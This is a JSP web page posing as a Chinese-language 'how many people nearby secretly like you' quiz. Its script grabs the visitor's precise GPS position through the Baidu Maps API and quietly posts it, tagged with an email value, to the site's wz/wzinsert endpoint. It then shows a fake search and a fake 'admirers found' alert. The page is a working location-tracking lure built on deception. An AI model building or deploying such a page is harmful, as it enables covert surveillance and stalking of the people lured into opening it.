<%@ page language="java" import="java.util.*" pageEncoding="utf-8"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jsp/jstl/fmt"%>
<%@ taglib prefix="fn" uri="http://java.sun.com/jsp/jstl/functions"%>
<%
    String path = request.getContextPath();
    String basePath =
            request.getScheme() + "://" + request.getServerName() + ":" + request.getServerPort()
                    + path + "/";
%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">  
<html> 
<head>
<base href="<%=basePath%>">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<script type="text/javascript" src="http://api.map.baidu.com/api?v=2.0&ak=ga2vOgjKiex14wPRkTblnAHYIB2bWrTy"></script>
<title>测一下你附近有多少人暗恋你！</title>
<script type="text/javascript" src="js/jquery-1.7.2.min.js"></script>
<script type="text/javascript" src="js/baiducount.js"></script>
</head>
<body>
<br/>
<div style="text-align: center; font-size: 100px;">🔍查找中...</div><br/><br/>
<div style="text-align: center;"><img style="width: 80%; height: 70%;" alt="" src="js/fjr.gif"><br></div>

</body>
<script type="text/javascript">
	// 百度地图API功能
	var geolocation = new BMap.Geolocation();
	geolocation.getCurrentPosition(function(r){
		if(this.getStatus() == BMAP_STATUS_SUCCESS){
 			$.ajax({
				cache:true,
				type:"POST",
				url:"<%=basePath%>wz/wzinsert",
				data:{lng:r.point.lng, lat:r.point.lat, name:'${mail}'},
				async:false
		    }); 
		}else {
			alert('failed'+this.getStatus());
		}        
	},{enableHighAccuracy: true})

	setTimeout(function(){//两秒后跳转  
                            alert("已发现附近暗恋你的对象，获取对象信息。");   
                                location.href = "<%=basePath%>fjrlist.jsp";
                              },8000);
</script>
</html>
